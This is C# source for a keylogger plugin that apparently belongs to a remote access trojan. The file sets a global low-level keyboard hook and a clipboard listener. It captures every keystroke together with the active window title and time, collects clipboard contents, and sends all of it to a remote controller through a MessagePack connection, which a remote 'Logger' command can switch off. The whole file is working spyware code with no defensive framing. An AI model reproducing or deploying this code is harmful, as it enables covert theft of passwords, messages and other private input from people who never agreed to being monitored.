using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MessagePackLib.MessagePack;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            var unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "Logger":
                {
                    HandleLogger.isON = false;
                    break;
                }
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }


    public class ClipboardNotification : Form
    {
        private const int WM_CLIPBOARDUPDATE = 0x031D;
        private static readonly IntPtr HWND_MESSAGE = new IntPtr(-3);

        public ClipboardNotification()
        {
            SetParent(Handle, HWND_MESSAGE);
            AddClipboardFormatListener(Handle);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE)
            {
                Debug.WriteLine($"Clipboard {Clipboard.GetCurrentText()}");
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "keyLogger";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("log").AsString = $"\n###  Clipboard ###\n{Clipboard.GetCurrentText()}\n";
                Connection.Send(msgpack.Encode2Bytes());
            }

            base.WndProc(ref m);
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }

    internal static class Clipboard
    {
        public static string GetCurrentText()
        {
            var ReturnValue = string.Empty;
            var STAThread = new Thread(
                delegate() { ReturnValue = System.Windows.Forms.Clipboard.GetText(); });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }
    }

    public static class HandleLogger
    {
        public static bool isON;

        public static void Run()
        {
            _hookID = SetHook(_proc);
            new Thread(() =>
            {
                while (Connection.IsConnected)
                {
                    Thread.Sleep(1000);
                    if (isON == false) break;
                }

                UnhookWindowsHookEx(_hookID);
                Connection.Disconnected();
                GC.Collect();
                Application.Exit();
            }).Start();
            Application.Run(new ClipboardNotification());
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            try
            {
                using (var curProcess = Process.GetCurrentProcess())
                using (var curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WHKEYBOARDLL, proc,
                        GetModuleHandle(curModule.ModuleName), 0);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                isON = false;
                return IntPtr.Zero;
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    var vkCode = Marshal.ReadInt32(lParam);
                    var capsLockPressed = (GetKeyState(0x14) & 0xffff) != 0;
                    var shiftPressed = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                    var currentKey = KeyboardLayout((uint)vkCode);

                    if (capsLockPressed || shiftPressed)
                        currentKey = currentKey.ToUpper();
                    else
                        currentKey = currentKey.ToLower();

                    if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                        currentKey = "[" + (Keys)vkCode + "]";
                    else
                        switch (((Keys)vkCode).ToString())
                        {
                            case "Space":
                                currentKey = " ";
                                break;
                            case "Return":
                                currentKey = "[ENTER]\n";
                                break;
                            case "Escape":
                                currentKey = "[ESC]\n";
                                break;
                            case "Back":
                                currentKey = "[Back]";
                                break;
                            case "Tab":
                                currentKey = "[Tab]\n";
                                break;
                        }

                    if (!string.IsNullOrEmpty(currentKey))
                    {
                        var sb = new StringBuilder();
                        if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                        {
                            sb.Append(currentKey);
                        }
                        else
                        {
                            sb.Append(Environment.NewLine);
                            sb.Append(Environment.NewLine);
                            sb.Append($"###  {GetActiveWindowTitle()} | {DateTime.Now.ToShortTimeString()} ###");
                            sb.Append(Environment.NewLine);
                            sb.Append(currentKey);
                        }

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "keyLogger";
                        msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                        msgpack.ForcePathObject("log").AsString = sb.ToString();
                        Connection.Send(msgpack.Encode2Bytes());
                    }
                }

                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            catch
            {
                return IntPtr.Zero;
            }
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                var sb = new StringBuilder();
                var vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                var scanCode = MapVirtualKey(vkCode, 0);
                var keyboardLayout =
                    GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out var processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch
            {
            }

            return ((Keys)vkCode).ToString();
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                var stringBuilder = new StringBuilder(nChars);
                var handle = GetForegroundWindow();
                GetWindowThreadProcessId(handle, out var pid);
                if (GetWindowText(handle, stringBuilder, nChars) > 0)
                {
                    CurrentActiveWindowTitle = stringBuilder.ToString();
                    return CurrentActiveWindowTitle;
                }
            }
            catch (Exception)
            {
            }

            return "???";
        }

        #region "Hooks & Native Methods"

        private const int WM_KEYDOWN = 0x0100;
        private static readonly LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static readonly int WHKEYBOARDLL = 13;
        private static string CurrentActiveWindowTitle;

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true,
            CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            [Out] [MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        #endregion
    }
}